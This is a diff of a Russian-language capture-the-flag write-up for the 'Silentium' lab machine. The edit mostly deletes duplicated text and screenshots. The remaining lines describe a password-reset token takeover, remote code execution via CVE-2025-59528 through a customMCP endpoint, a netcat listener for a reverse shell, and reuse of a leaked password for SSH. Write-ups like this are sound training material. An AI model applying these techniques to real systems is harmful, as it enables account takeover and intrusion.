@@ -43,11 +43,6 @@ Gobuster нашёл нам один путь это `staging.silentium.htb` пр
 Как и с `silentium.htb` добавляем `staging.silentium.htb` в `/etc/hosts`
 
 ![](files_photo/Silentium/staging_working.png)
-![](files_photo/Silentium/staging_error.png)
-
-Как и с `silentium.htb` добавляем `staging.silentium.htb` в `/etc/hosts`
-
-![](files_photo/Silentium/staging_working.png)
 
 
 6 поиск уязвимостей
@@ -122,18 +117,6 @@ elena@silentium.htb
 ![](files_photo/Silentium/api_key_found.png)
 ![](files_photo/Silentium/curl_request.png)
 
-Как видим нам откликается только почта Бена теперь подставляем полученный `temptoken` во второй запрос
-
-![](files_photo/Silentium/succes_curl_change_password.png)
-
-Как видим мы поменяли пароль Бену теперь заходим под его обновлёнными данными
-
-![](files_photo/Silentium/login.png)
-
-Видим следующий `Dashboard` просмотрев его меня заинтересовал раздел API Keys
-
-![](files_photo/Silentium/dashboard.png)
-![](files_photo/Silentium/api_key_found.png)
 
 Теперь вернёмся к найденным CVE а именно к `CVE-2025-59528` благодаря которой можно получить `RCE` для входа на сервер подробнее про это можно почитать тут: https://github.com/advisories/GHSA-3gcm-f6qx-ff7p
 
@@ -154,8 +137,6 @@ curl -X POST http://localhost:3000/api/v1/node-load-method/customMCP \
 
 для этого поднимаем слушатель на порту 4444 с помощью `nc -lvnp 4444`
 
-
-![](files_photo/Silentium/nc_listener.png)
 
 ![](files_photo/Silentium/nc_listener.png)
 
@@ -191,17 +172,6 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 
 ![](files_photo/Silentium/env_environment_variable.png)
 
-![](files_photo/Silentium/shell.png)
-
-далее осматриваемся в директориях и видим что мы находимся в docker контейнере гуглим каким способом можно выбраться или какие данные можно получить из него
-
-![](files_photo/Silentium/list_dir.png)
-
-К сожалению выбраться из него нельзя тогда ищем как можно найти что то полезное в этом контейнере и находим что через команду env можно вывести информацию о всех переменных окружения
-
-![](files_photo/Silentium/env_environment_variable.png)
-
-
 пробуем эти данные для входа в ssh и пароль `r04D!!_R4ge` подходит для ssh сессии 
 прописываем ls -la и находим первый флаг
 
@@ -212,14 +182,7 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 
 ![](files_photo/Silentium/gogs_web.png)
 
-![](files_photo/Silentium/user_flag.png)
-
-Теперь надо поднятся до root первым делом смотрим что запущено на системе с помощью `ps aux` и натыкаемся на интересную программу `gogs`
-
-![](files_photo/Silentium/gogs_web.png)
-
-
- гуглим что это такое:
+гуглим что это такое:
 
 ```
 Gogs (Go Git Service) — это легковесный веб-интерфейс для хостинга Git-репозиториев и совместной разработки, который можно развернуть на собственном сервере (_self-hosted_ решение). Он считается отличной и очень экономной альтернативой GitHub или GitLab для небольших команд.
